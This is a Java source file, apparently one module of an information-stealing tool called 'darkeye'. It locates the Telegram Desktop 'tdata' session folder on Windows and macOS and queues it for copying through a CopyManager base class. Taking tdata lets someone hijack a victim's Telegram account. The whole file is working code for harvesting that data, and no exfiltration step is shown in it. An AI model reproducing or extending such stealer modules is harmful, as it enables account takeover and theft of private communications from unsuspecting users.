package org.spray.darkeye.module;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.spray.darkeye.managers.CopyManager;
import org.spray.darkeye.objects.Data;
import org.spray.darkeye.objects.FileData;
import org.spray.darkeye.utils.OSTools;
import org.spray.darkeye.utils.Utils;

public class TelegramModule extends CopyManager {

	public TelegramModule(String path) {
		super(path);
	}

	@Override
	public String getPath() {
		return "Telegram";
	}

	@Override
	protected List<Data> getData() {
		if (!new File(getFolder()).exists())
			return null;

		List<Data> data = new ArrayList<>();

		List<FileData> files = new ArrayList<>();

		File tdata = new File(getTData());
		files.add(new FileData(tdata, tdata.getName()));

		data.add(new Data(files, ""));

		return data;
	}

	private String getTData() {
		String dataFolder = "";
		File folder = new File(getFolder());

		File[] listOfFiles = folder.listFiles();

		for (File file : listOfFiles) {
			if (file.isDirectory() && Utils.isUpperString(file.getName())) {
				dataFolder = file.getAbsolutePath();
			}
		}
		return dataFolder;
	}

	private String getFolder() {
		String folder = "";
		switch (OSTools.getType()) {
		case Windows:
			folder = System.getenv("APPDATA") + "/Telegram Desktop/tdata/";
			break;
		case MacOS:
			folder = "/Library/Application Support/Telegram Desktop/tdata/";
			break;
		default:
			break;
		}
		return folder;
	}

}
